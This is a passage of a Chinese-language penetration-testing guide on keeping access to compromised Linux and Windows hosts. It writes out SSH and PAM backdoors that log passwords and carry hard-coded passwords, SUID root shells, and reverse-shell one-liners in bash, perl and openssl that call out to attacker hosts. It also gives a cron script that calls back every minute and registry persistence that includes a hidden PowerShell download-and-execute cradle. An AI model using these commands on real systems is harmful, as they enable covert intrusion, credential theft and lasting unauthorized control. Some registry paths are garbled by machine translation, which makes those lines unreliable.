写不进内存，复现失败，写入的内存地址为 0x00000000,存在内存保护机制
![](media/image182.jpeg){width="5.868902012248469in" height="2.6125in"}
####### SSH 衍生的各种方式
1.  openssh yum
    包替换，重新编译，重启服务
> tar -zxvf openssh-5.9p1.tar.gz
>
> tar -zxvf 0x06-openssh-5.9p1.patch.tar.gz
>
> vim includes.h //修改后门密码，记录文件位置，
>
> /\*
>
> #define ILOG \"/tmp/ilog\" //记录登录到本机的用户名和密码#define OLOG
> \"/tmp/olog\" //记录本机登录到远程的用户名和密码#define SECRETPW
> \"root123\" //你后门的密码
>
> \*/
2.  ssh wrapper 正向后门利用https://evi1cg.me/archives/Pentest_SSH.html
简介 init 首先启动的是/usr/sbin/sshd,脚本执行到getpeername
这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。
原始的sshd 监听端口建立了tcp 连接后，会fork
一个子进程处理具体工作。这个子进
程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。
此时子进程标准输入输出已被重定向到套接字，getpeername
能真的获取到客户端的TCP 源端口，如果是 19526 就执行sh 给个shell。
利用方法
> 客户端：
>
> \[root@localhost \~\]# cd /usr/sbin \[root@localhost sbin\]# mv sshd
> ../bin
>
> \[root@localhost sbin\]# echo \'#!/usr/bin/perl\' \>sshd
>
> \[root@localhost sbin\]# echo \'exec \"/bin/sh\" if(getpeername(STDIN)
> =\~ /\^..4A/);\' \>\> sshd
>
> \[root@localhost sbin\]# echo \'exec{\"/usr/bin/sshd\"}
> \"/usr/sbin/sshd\",@ARGV,\' \>\>ss hd
>
> \[root@localhost sbin\]# chmod u+x sshd \[root@localhost sbin\]#
> /etc/init.d/sshd restart 控制端：
>
> socat STDIOTCP4:target_ip:22,sourceport=19526
####### PAM 利用
1）下载对应版本pam 包，修改源码，重新编译生成so
进行替换https://gorgias.me/2018/03/25/Linux-
%E5%90%8E%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-
PAM%E5%90%8E%E9%97%A8/
> 获取目标系统所使用的PAM版本： rpm-qa\|greppam
>
> 编译安装PAM
>
> 将本地pamunixauth.c文件通过打补丁方式，编译生成。
>
> 编译完后的文件在：modules/pamunix/.libs/pamunix.so，后门密码为root123,并会在/tmp/pslog记录root登录密码。
####### ineted 正向后门利用
https://klionsec.github.io/2017/10/23/inetd-backdoor/
####### 基于 SUID 的各种衍生利用
首先, 先切换成为root 用户，并执行以下的命令:
> cp /bin/bash /.woot chmod 4755 /.woot ls -al /.woot
>
> -rwsr-xr-x 1 root root 690668 Jul 24 17:14 /.woot
当然,
你也可以起其他更具备隐藏性的名字,我想猥琐并机智的你，肯定能想出很多好的名字的。
文件前面的那一点也不是必要的，只是为了隐藏文件(
在文件名的最前面加上"."，就可以在任意文件目录下进行隐藏) .
现在，做为一个普通用户，我们来启用这个后门:
> id
>
> uid=1000(fw) gid=1000(fw) groups=1000(fw)
>
> /.woot.woot-2.05b\$ id
>
> uid=1000(fw) gid=1000(fw) groups=1000(fw).woot-2.05b\$
为什么不行呢?
因为 bash2 针对 suid 有一些护卫的措施. 但这也不是不可破的:
> /.woot -p id
>
> uid=1000(fw) gid=1000(fw) euid=0(root) groups=1000(fw)
使用-p 参数来获取一个root shell. 这个euid 的意思是 effective user id
这里要特别注意的是，作为一个普通用户执行这个SUID shell
时，一定要使用全路径。
如何查找那些具有SUID 的文件: find / -perm +4000 -ls
这时就会返回具有SUID 位的文件啦。
4.  ####### 替换常用的系统命令
5.  **反弹各种 shell 的方式**
```{=html}
```
1.  常规方式：
> vps 执行 nc -lvvp 4444
>
> 目标主机执行 bash -i \>& /dev/tcp/172.16.1.1/4444 0\>&1
2.  perl 方式： 方法一：
> perl -e \'use\'
> Socket;\$i=\"x.x.x.x\";\$p=5555;socket(S,PF_INET,SOCK_STREAM,getprot
> obyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\"\>&S\");ope
> n(STDOUT,\"\>&S\");open(STDERR,\"\>&S\");exec(\"/bin/sh -i\");};\'
方法二：
> perl -MIO -e \'\$p=fork;exit,if(\$p);\$c=new
> IO::Socket::INET(PeerAddr,\"x.x.x.x:5555\");S
> TDIN-\>fdopen(\$c,r);\$\~-\>fdopen(\$c,w);system\$\_ while\;\'
3.  openssl 加密传输
> 在vps 上生成SSL 证书的公私密钥对
>
> openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days
> 365 -n odes
>
> 在vps 上监听反弹shell 的端口
>
> openssl s_server -quiet -key key.pem -cert cert.pem -port 4433
> 在目标机器上用openssl 加密反弹shell 的流量
>
> mkfifo /tmp/s;/bin/bash -i \&1\|openssl s_client -quiet
> -connect vps:44 3 \> /tmp/s;rm /tmp/s
####### 常规系统计划任务
1）利用 Unix/Linux 自带的 Bash 和 Crond
实现远控功能，保持反弹上线到公网机器。
先创建 /etc/backdoor.sh
脚本文件（名字自己改），利用该脚本进行反弹。以下脚本代表全自动反弹到
8.8.8.8 的 53 端口。
> #!/bin/bash
>
> if netstat -ano\|grep -v grep \| grep \"8.8.8.8\"\>/dev/null then
>
> echo \"OK\"\>/dev/null else
>
> /sbin/iptables \--policy INPUT ACCEPT
>
> /sbin/iptables \--policy OUTPUT ACCEPT bash -i \>& /dev/tcp/8.8.8.8/53
> 0\>&1
>
> fi
chmod +755 /etc/backdoor.sh
然后我们需要修改一下 /etc/crontab 让它定时执行。
nano /etc/crontab 在 /etc/crontab 文件末加入这一行。代表每 1
分钟执行一次。
> \*/1 \* \* \* \* root /etc/xxxx
最后重启一下 crond 的服务。（不同发行版重启方式不一样，自行查询）
service cron reload
service cron start
然后在 8.8.8.8 的服务器上使用 NC 接收 Shell 即可。nc -vv -lp 53
####### 各种开源 rootkit
https://phyb0x.github.io/2018/10/23/linux%E6%9D%83%E9%99%90%E7
%BB%B4%E6%8C%81-%E5%90%8E%E9%97%A8/
####### apache 和 nginx 的 lua 模块
10. **windows 下利用注册表进行权限维持**
注册表可以理解为一个树状结构的数据库，它具有一些特殊的数据类型用来存储一些数据满足应用程序的需要。
> 名称 作用
>
> HKEYCLASSESROOT 用于存储一些文档类型，类，类的关联属
>
> 性HKEYCURRENTCONFIG 用户存储有关本地计算机系统的当前硬件
>
> 配置文件信息
>
> HKEYCURRENTUSER 用于存储当前用户配置项
>
> HKEYCURRENTUSERLOCALSETTI NGS
>
> 用于存储当前用户对计算机的配置项
>
> HKEYLOCALMACHINE 用于存储当前用户物理状态 HKEY_USERS
> 用于存储新用户的默认配置项
运行/运行密钥
运行键值代表着开机启动项，也就是说在这个项下的键值会随着开机启动（这里的开机是指用户登录，也就是说只要有登录操作就会执行）。
RunOnce 键值类似于Run 键值，唯一的区别在于，RunOnce 键值只执行一次，
操作执行后会被自动删除。
用户级
> HKEY_CURRENT_USER \\软件\\微软\\的Windows \\ CurrentVersion \\ Run
> 中HKEY_CURRENT_USER \\软件\\微软\\的Windows \\ CurrentVersion
> \\的RunOnce
管理员
> HKEY_LOCAL_MACHINE \\ SOFTWARE \\微软\\的Windows \\ CurrentVersion \\
> Run 中
>
> HKEY_LOCAL_MACHINE \\ SOFTWARE \\微软\\的Windows \\ CurrentVersion
> \\的Run Once
>
> HKEY_LOCAL_MACHINE \\ SOFTWARE \\微软\\的Windows \\ CurrentVersion
> \\政策\\ 探险\\运行
####### BootExecute 密钥
可以通过它来实现启动Natvice
程序，本机程序在驱动程序和系统核心加载后将被加载，此时会话管理器（SMSS.EXE）进行WINDOWSNT
用户模式并开始按顺序启动本机程序。由于SMSS.EXE 在的Windows
子系统加载之前启动，因此会调用配置子系统来加载当前的配置单元具体注册表键值为：
> HKEY_LOCAL_MACHINE \\ 系 统 \\ CurrentControlSet \\ 控 制 \\ hivelist
> HKEY_LOCAL_MACHINE \\ SYSTEM \\ ControlSet002 \\ Control \\ Session
> Manager
上述注册表下有一个名为BootExecute 的多字符串值键，它的默认值是autocheck
autochk
\*，用于系统启动时的某些自动检查。这个启动项目里的程序是在系统图形界面完成前就被执行的，所以具有很高的优先级。
####### 用户名密钥
Userinit 注册表键的作用是在用户进行登陆时，WinLogon
进程加载的指定的登录脚本，可以更改它的值来添加与删除程序。具体键值：
> HKEY_LOCAL_MACHINE \\ SOFTWARE \\ Microsoft \\ Windows NT \\
> CurrentVersion
>
> \\ Winlogon
一般情况下，其默认值为的userinit.exe，由于该子键的值中可使用逗号分隔开多
个程序，因此，在键值的数值中可加入其它程序。
结合中msf 的PowerShell 的方法，可以达到无文件后门效果：
> PowerShell 的实现：
>
> Set-ItemProperty"HKLM：\\ SOFTWARE \\ Microsoft \\ WINDOWS NT \\
> CurrentVersi on \\ Winlogon"-name Userinit -value"C：\\ Windows \\
> system32 \\ userinit.exe，po wershell.exe -nop -w hidden -c \$ w =
> new- object net.webclient; \$ w.proxy = \[Net. WebRequest\] ::
> GetSystemWebProxy（）; \$ w.Proxy.Credentials = \[Net.CredentialC
> ache\] :: DefaultCredentials; IEX \$
> w.downloadstring（\'http：//192.168。 2.11：8080
>
> / kaMhC1\' ）;"
>
> #powerhell反弹shell的有效载荷参照msf中的web_delivery模块
####### LogonScripts 键
Logon Scripts
能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截，具体键值：
> HKEY_CURRENT_USER \\环境\\
>
> 创建字符串键值：UserInitMprLogonScript 键值设置为绝对路径：C：\\ 1.BAT
####### 启动密钥
开始菜单启动项，指示启动文件夹的位置，用户外壳文件夹优先于外壳文件夹。
> HKEY_CURRENT_USER \\ Software \\ Microsoft \\ Windows \\
> CurrentVersion \\ Expl orer \\ User Shell Folders